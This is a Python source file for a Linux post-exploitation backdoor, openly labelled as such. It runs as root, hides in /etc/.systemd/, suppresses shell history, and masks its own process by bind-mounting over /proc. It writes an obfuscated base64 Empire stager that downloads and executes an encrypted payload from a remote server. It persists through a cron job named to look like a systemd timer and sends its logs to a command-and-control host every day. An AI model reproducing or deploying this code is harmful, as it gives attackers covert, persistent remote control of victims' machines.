#!/usr/bin/env python3
import os
import string
import logging
import socket
import random
from time import sleep


"""
Author       - pyCity
Date         - 4/10/2019
Version      - 1.0

Usage:       - python one_shot.py
             - Or compile with pyinstaller --onefile one_shot.py

Description: - Post-exploitation tool in python 3
             - Creates a hidden directory, hides current pid, writes payloads to disk, and adds payload to cron.d
             - Supports python 2.7 and python3


    PSUEDOCODE:

1) Create hidden directory
    Dont record any history
    Hide current pid
Main loop
    2) Write stage 1 to hidden dir
    3) Run stage 1
        gets empire(or)dbd payload (stage 2)
        run empire payload
    4) Add payload to cron
    5) Symlink payload to "ls"
    6) Send output to C2 once per day

Compile to .elf binary before delivery
"""

# -------------------------------------------------------------------------------------------------

# Variables

hidden_directory = "/etc/.systemd/"  # Hidden directory to house malware
stager_name = "backd"                # Name of the persistent payload file

# Host and port to recieve logs
host = "127.0.0.1"
port = 443

# Empire payload in stager_code
stager_code = """#!/bin/bash\necho "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgc3NsOwppZiBoYXNhdHRyKHNzbCwgJ19jcmVhdGVfdW52ZXJpZmllZF9jb250ZXh0Jyk6c3NsLl9jcmVhdGVfZGVmYXVsdF9odHRwc19jb250ZXh0ID0gc3NsLl9jcmVhdGVfdW52ZXJpZmllZF9jb250ZXh0OwppbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHBzOi8vMTAuMC4wLjIyOjQ0Myc7dD0nL2FkbWluL2dldC5waHAnO3JlcT11cmxsaWIyLlJlcXVlc3Qoc2VydmVyK3QpOwpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsVUEpOwpyZXEuYWRkX2hlYWRlcignQ29va2llJywic2Vzc2lvbj16dkc4RUVFNDEwbGRHZkxrc3RFeWd3SXA1Rk09Iik7CnByb3h5ID0gdXJsbGliMi5Qcm94eUhhbmRsZXIoKTsKbyA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKHByb3h5KTsKdXJsbGliMi5pbnN0YWxsX29wZW5lcihvKTsKYT11cmxsaWIyLnVybG9wZW4ocmVxKS5yZWFkKCk7CklWPWFbMDo0XTtkYXRhPWFbNDpdO2tleT1JVisnT15tWGF5LFdCY3QzbDxRZjBbSU1ldy1Vezo9QF82flYnO1MsaixvdXQ9cmFuZ2UoMjU2KSwwLFtdCmZvciBpIGluIHJhbmdlKDI1Nik6CiAgICBqPShqK1NbaV0rb3JkKGtleVtpJWxlbihrZXkpXSkpJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQppPWo9MApmb3IgY2hhciBpbiBkYXRhOgogICAgaT0oaSsxKSUyNTYKICAgIGo9KGorU1tpXSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCiAgICBvdXQuYXBwZW5kKGNocihvcmQoY2hhcileU1soU1tpXStTW2pdKSUyNTZdKSkKZXhlYygnJy5qb2luKG91dCkp'));" | /usr/bin/python &\n"""

# Code to add to /etc/cron.d/systemd-timer
cron_code = """SHELL=/bin/bash\n* * * * *  root  if [[ $(ps aux | grep [p]ython | wc -l) -lt 1 ]]; then bash /etc/.systemd/backd; else echo 'Process alive';fi\n"""

# -------------------------------------------------------------------------------------------------


# Make sure we have sudo privs
if os.getuid() != 0:
    exit("[!] Must run as root")


# Don't record any history. This is equivalent to unset histfile
os.putenv("HISTFILE", "/dev/null")

# Log everything to a txt file in hidden directory, send it to C2 once per day via sockets
# logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")

# Generate id used to hide pid
ch = string.ascii_uppercase + string.digits
token = "".join(random.choice(ch) for i in range(5))
pid = os.getpid()

# Create hidden directory, log file, and log handler
try:
    if os.path.exists(hidden_directory):
        print("[+] Directory exists")
    else:
        os.mkdir(hidden_directory)
        print("[+] {} successfully created".format(hidden_directory))

    if os.path.exists("backd.log"):
        print("[+] Log exists")
    else:
        with open(hidden_directory + "backd.log", "w+") as f:
            print("[+] backd.log was successfully created. Logging everything to file")
except OSError as err:
    print("[!] An error occured: {}".format(err))
finally:
    os.chdir(hidden_directory)

# Log output to a txt file in hidden directory, Only save info and up (no debug) and send it to C2 once per day via sockets
logging.basicConfig(filename="backd.log", filemode="a", level=logging.INFO, format="%(asctime)s - %(message)s - %(levelname)s")

# Main loop
while True:

    # Hide current running process
    logging.debug("[+] Attempting to hide current process")
    if os.path.exists(hidden_directory + token):
        logging.info("[!] Directory with token already exists!")
    else:
        # Bind mount on current process's folder in /proc to hide it
        os.system("mkdir {0}{2} && mount -o bind {0}{2} /proc/{1}".format(hidden_directory, pid, token))
        logging.info("[+] Current process successfully hidden")

    # Write stager to disk
    logging.debug("[+] Writing stager to hidden directory")
    if os.path.exists(hidden_directory + stager_name):
        logging.info("[+] {}{} already exists".format(hidden_directory, stager_name))
    else:
        with open(stager_name, "w+") as f:
            f.write(stager_code)
        logging.info("[+] Stager successfully written to disk")

    # Make payload executable. Since we're already running as root, no need to chown the file
    logging.debug("[+] Checking {} permissions".format(stager_name))
    if os.access(stager_name, os.X_OK):
        logging.info("[+] {} has correct permissions".format(stager_name))
    else:
        os.chmod(stager_name, 0o755)

    # Add payload to crontab
    logging.debug("[+] Verifying payload keepup script is in cron.d")
    if os.path.exists("/etc/cron.d/systemd-timer"):
        logging.info("[+] Payload exists in crontab")
    else:
        with open("/etc/cron.d/systemd-timer", "w+") as f:
            f.write(cron_code)
        logging.info("[+] Payload keepup script written to cron.d")

    # Send Read output and send to C2
    with open(hidden_directory + "backd.log", "r") as f:
        logs = f.read()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(str.encode(logs))
    s.close()

    # Sleep for one day
    logging.info("Sleeping for one day...")
    sleep(86400)
